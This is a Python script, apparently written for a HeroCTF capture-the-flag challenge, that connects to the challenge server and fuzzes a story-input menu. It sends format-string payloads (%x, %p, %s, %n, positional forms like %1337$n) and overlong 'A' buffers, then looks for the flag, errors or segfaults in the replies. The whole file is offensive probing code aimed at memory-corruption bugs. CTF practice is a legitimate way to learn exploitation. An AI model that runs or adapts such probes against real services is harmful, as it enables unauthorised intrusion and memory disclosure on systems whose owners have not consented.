#!/usr/bin/env python3
import socket
import time

def test_format(length, story):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect(('dyn06.heroctf.fr', 13683))
    
    def recv_all(s):
        data = b''
        s.settimeout(2)
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
            except socket.timeout:
                break
        return data.decode('utf-8', errors='ignore')
    
    try:
        recv_all(s)
        s.send(b'1\n')
        recv_all(s)
        s.send(f'{length}\n'.encode())
        recv_all(s)
        s.send(story.encode() + b'\n')
        time.sleep(1)
        result1 = recv_all(s)
        
        s.send(b'4\n')
        time.sleep(1)
        results = recv_all(s)
        
        s.send(b'2\n')
        time.sleep(1)
        last = recv_all(s)
        
        output = results + last
        if 'Hero{' in output or 'flag' in output.lower() or 'error' in output.lower() or 'segfault' in output.lower():
            print(f"\n=== INTERESTING with length={length}, story={story[:30]} ===")
            print(output)
            return True
    except Exception as e:
        pass
    finally:
        s.close()
    return False

# Probar format strings específicos
formats = [
    ('%x' * 20, 64),
    ('%p' * 20, 64),
    ('%s' * 20, 64),
    ('%n' * 10, 64),
    ('%1$x', 64),
    ('%1$p', 64),
    ('%1$s', 64),
    ('%1$n', 64),
    ('%1337$x', 64),
    ('%1337$p', 64),
    ('%1337$s', 64),
    ('%1337$n', 64),
    ('AAAA%x%x%x%x', 64),
    ('AAAA%p%p%p%p', 64),
    ('%x.%x.%x.%x.%x', 64),
    ('%p.%p.%p.%p.%p', 64),
]

# También probar longitudes que podrían causar overflow
for length in [64, 65, 66, 67, 68, 69, 70, 80, 100, 128, 256]:
    story = 'A' * length
    if test_format(length, story):
        break
    time.sleep(0.2)

for fmt, length in formats:
    if test_format(length, fmt):
        break
    time.sleep(0.2)
